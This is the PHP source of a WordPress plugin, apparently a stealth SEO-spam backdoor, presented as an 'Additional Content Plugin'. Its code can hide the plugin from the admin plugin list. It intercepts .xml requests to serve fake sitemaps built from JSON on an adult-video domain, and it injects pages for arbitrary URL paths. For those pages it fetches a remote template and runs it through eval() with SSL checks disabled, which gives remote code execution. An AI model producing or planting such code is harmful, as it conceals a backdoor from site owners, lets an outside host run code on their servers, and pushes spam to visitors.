<?php
/*
Plugin Name: Additional Content Plugin
Description: Plugin konten & sitemap stealth dengan Intercept Level Tinggi (Prioritas -9999).
Version: 6.3
Author: Grok
*/

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// KONFIGURASI URL DEFAULT
define('ACP_TEMPLATE_URL', 'https://player.javpornsub.net/template/index.txt');
define('ACP_JSON_BASE_URL', 'https://player.javpornsub.net/content/');

// ==========================================
// 1. SUPER EARLY INTERCEPT (LEVEL "NUKLIR")
// Berjalan di plugins_loaded prioritas -9999 (Sangat Awal)
// ==========================================
add_action('plugins_loaded', 'acp_nuclear_intercept', -9999);
function acp_nuclear_intercept() {
    // Cek apakah ini request XML?
    if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '.xml') !== false) {
        
        // Bersihkan URL untuk mendapatkan nama file
        $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $filename_raw = basename($path); // misal: 39o06.xml atau 39o06-2.xml
        
        // Hapus ekstensi .xml
        $filename_no_ext = str_replace('.xml', '', $filename_raw);
        
        // Cek Pagination (misal: nama-2)
        $sitemap_name = $filename_no_ext;
        $page = 1;
        
        if (preg_match('/^(.*?)-(\d+)$/', $filename_no_ext, $matches)) {
            $sitemap_name = $matches[1];
            $page = intval($matches[2]);
        }

        // Ambil data endpoint dari DB
        // Karena ini sangat awal, kita pastikan get_option sudah bisa dipakai
        $endpoints = get_option('acp_endpoints', []);
        
        if (empty($endpoints)) return; // Lanjut ke WP biasa jika kosong

        $target_endpoint = false;
        foreach ($endpoints as $ep) {
            // Cek kesamaan nama & status aktif
            if (isset($ep['status']) && $ep['status'] === 'active' && $ep['sitemap_name'] === $sitemap_name) {
                $target_endpoint = $ep;
                break;
            }
        }

        // JIKA KETEMU => SAJIKAN XML => MATIKAN WP (DIE)
        if ($target_endpoint) {
            // Header XML
            if (!headers_sent()) {
                header('HTTP/1.1 200 OK');
                header('Content-Type: application/xml; charset=utf-8');
                header('X-Robots-Tag: noindex, follow');
            }

            // Ambil JSON
            $json_url = ACP_JSON_BASE_URL . $target_endpoint['json_filename'] . '.json';
            
            // Bypass Transient WP (Raw Fetch) agar tidak kena cache issue di hook awal
            // Kita pakai curl manual simple atau file_get_contents kalau allow_url_fopen nyala
            // Tapi agar aman tetap pakai wp_remote_get (karena plugins_loaded sudah memuat fungsi dasar)
            
            $konten_data = [];
            $response = wp_remote_get($json_url, ['timeout' => 30, 'sslverify' => false]);
            
            if (!is_wp_error($response)) {
                $body = wp_remote_retrieve_body($response);
                $data = json_decode($body, true);
                if (is_array($data)) {
                    $konten_data = $data;
                }
            }

            // Generate Output
            echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
            echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
            
            if (!empty($konten_data)) {
                $max_urls = 45000;
                $chunks = array_chunk($konten_data, $max_urls, true);
                $chunk_index = $page - 1;

                if (isset($chunks[$chunk_index])) {
                    foreach ($chunks[$chunk_index] as $title => $desc) {
                        echo "\t<url>\n";
                        echo "\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n";
                        echo "\t\t<lastmod>" . date('c') . "</lastmod>\n";
                        echo "\t\t<changefreq>weekly</changefreq>\n";
                        echo "\t</url>\n";
                    }
                }
            } else {
                // Jika JSON kosong/gagal, tetap tampilkan XML valid (kosong) agar tidak 404
                echo "";
            }
            
            echo '</urlset>';
            
            // KILL PROCESS - Agar RankMath/Theme tidak me-load 404 page
            exit; 
        }
    }
}


// ==========================================
// 2. FITUR ADMIN & LAINNYA (Sama seperti sebelumnya)
// ==========================================

add_filter('all_plugins', 'acp_hide_plugin_from_list');
function acp_hide_plugin_from_list($plugins) {
    if (get_option('acp_plugin_hidden', false)) {
        $plugin_file = plugin_basename(__FILE__);
        if (isset($plugins[$plugin_file])) unset($plugins[$plugin_file]);
    }
    return $plugins;
}

add_action('admin_menu', 'acp_admin_menu');
function acp_admin_menu() {
    add_menu_page('Content Plugin', 'Content Plugin', 'manage_options', 'additional-content-plugin', 'acp_admin_page', 'dashicons-database');
}

function acp_generate_random_string($length = 5) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $length);
}

function acp_admin_page() {
    // Handler Visibility
    if (isset($_POST['acp_toggle_visibility'])) {
        check_admin_referer('acp_action');
        $curr = get_option('acp_plugin_hidden', false);
        update_option('acp_plugin_hidden', !$curr);
    }
    // Handler Setup
    if (isset($_POST['acp_setup_endpoints'])) {
        check_admin_referer('acp_action');
        $count = intval($_POST['endpoint_count']);
        if ($count > 0) {
            $new = [];
            for ($i = 0; $i < $count; $i++) {
                $new[] = [
                    'json_filename' => acp_generate_random_string(10),
                    'sitemap_name'  => acp_generate_random_string(5),
                    'status'        => 'pending'
                ];
            }
            update_option('acp_endpoints', $new);
        }
    }
    // Handler Generate
    if (isset($_POST['acp_generate_action'])) {
        check_admin_referer('acp_action');
        $endpoints = get_option('acp_endpoints', []);
        foreach ($endpoints as &$ep) {
            $ep['status'] = 'active';
        }
        update_option('acp_endpoints', $endpoints);
        echo '<div class="updated"><p>Status aktif! XML Sitemap siap diakses.</p></div>';
    }
    // Handler Reset
    if (isset($_POST['acp_reset'])) {
        check_admin_referer('acp_action');
        delete_option('acp_endpoints');
    }

    $endpoints = get_option('acp_endpoints', false);
    $is_hidden = get_option('acp_plugin_hidden', false);
    ?>
    <div class="wrap">
        <h1>Content Plugin (V6.3 Nuclear Mode)</h1>
        <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
            <div>Status Plugin: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
            <form method="post">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Show Plugin' : 'Hide Plugin'; ?>">
            </form>
        </div>

        <?php if (!$endpoints): ?>
            <div class="card" style="max-width:400px; padding:20px;">
                <h3>Setup Awal</h3>
                <form method="post">
                    <?php wp_nonce_field('acp_action'); ?>
                    <p>Jumlah Endpoint: <input type="number" name="endpoint_count" value="3" class="small-text"></p>
                    <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Siapkan Endpoint">
                </form>
            </div>
        <?php else: ?>
            <form method="post">
                <?php wp_nonce_field('acp_action'); ?>
                <table class="wp-list-table widefat fixed striped">
                    <thead>
                        <tr><th width="50">No</th><th>Target JSON</th><th>Virtual Sitemap</th></tr>
                    </thead>
                    <tbody>
                        <?php foreach ($endpoints as $i => $ep): 
                            $is_active = isset($ep['status']) && $ep['status'] === 'active';
                            $sitemap_url = home_url($ep['sitemap_name'] . '.xml');
                        ?>
                        <tr>
                            <td><?php echo $i + 1; ?></td>
                            <td>
                                <input type="text" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly onclick="this.select()"> .json
                                <br><small>URL: <?php echo ACP_JSON_BASE_URL . $ep['json_filename']; ?>.json</small>
                            </td>
                            <td>
                                <?php if ($is_active): ?>
                                    <a href="<?php echo $sitemap_url; ?>" target="_blank" style="font-weight:bold; color:green; text-decoration:none;">
                                        <span class="dashicons dashicons-yes"></span> <?php echo $ep['sitemap_name']; ?>.xml
                                    </a>
                                    <input type="text" id="sm_<?php echo $i; ?>" value="<?php echo $ep['sitemap_name']; ?>.xml" style="position:absolute;left:-9999px">
                                    <span class="dashicons dashicons-admin-page acp-copy" data-target="sm_<?php echo $i; ?>" style="cursor:pointer; color:#0073aa" title="Copy"></span>
                                <?php else: ?>
                                    <span style="color:#999; font-style:italic;">Menunggu Generate...</span>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <p class="submit" style="margin-top:20px;">
                    <input type="submit" name="acp_generate_action" class="button button-primary button-hero" value="GENERATE SITEMAP (Virtual)">
                </p>
            </form>
            <hr style="margin-top:30px;">
            <form method="post" onsubmit="return confirm('Reset?');">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_reset" class="button button-link-delete" value="Reset Konfigurasi">
            </form>
        <?php endif; ?>
    </div>
    <script>
    jQuery(document).ready(function($){
        $('.acp-copy').click(function(){
            var t = document.getElementById($(this).data('target'));
            t.select(); document.execCommand('copy');
            alert('Copied: ' + t.value);
        });
    });
    </script>
    <?php
}

// Handler Content (Sama seperti sebelumnya)
add_action('init', 'acp_register_rewrite_rules');
function acp_register_rewrite_rules() {
    add_rewrite_rule('^([^/]+)/?$', 'index.php?acp_value=$matches[1]', 'top');
}
add_filter('query_vars', function($v){ $v[] = 'acp_value'; return $v; });

add_action('template_redirect', 'acp_display_content');
function acp_display_content() {
    $val = get_query_var('acp_value');
    if (!$val) {
        $path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
        if (!empty($path) && !is_admin() && !get_page_by_path($path)) {
             $val = $path;
        } else {
            return;
        }
    }
    $title = sanitize_text_field(urldecode($val));
    if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;

    $endpoints = get_option('acp_endpoints', []);
    foreach ($endpoints as $ep) {
        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
        
        // Cache simple
        $json_url = ACP_JSON_BASE_URL . $ep['json_filename'] . '.json';
        $cache_key = 'acp_c_' . md5($json_url);
        $data = get_transient($cache_key);
        if ($data === false) {
            $resp = wp_remote_get($json_url, ['timeout'=>10, 'sslverify'=>false]);
            if (!is_wp_error($resp)) {
                $data = json_decode(wp_remote_retrieve_body($resp), true);
                set_transient($cache_key, $data, 3600);
            }
        }
        if (is_array($data)) {
            foreach ($data as $k => $v) {
                if (strtolower($k) === strtolower($title)) {
                    $additional_content = $v;
                    $tpl = wp_remote_get(ACP_TEMPLATE_URL, ['sslverify'=>false]);
                    if (!is_wp_error($tpl)) {
                        ob_start();
                        eval('?>' . wp_remote_retrieve_body($tpl));
                        echo ob_get_clean();
                        exit;
                    }
                }
            }
        }
    }
}
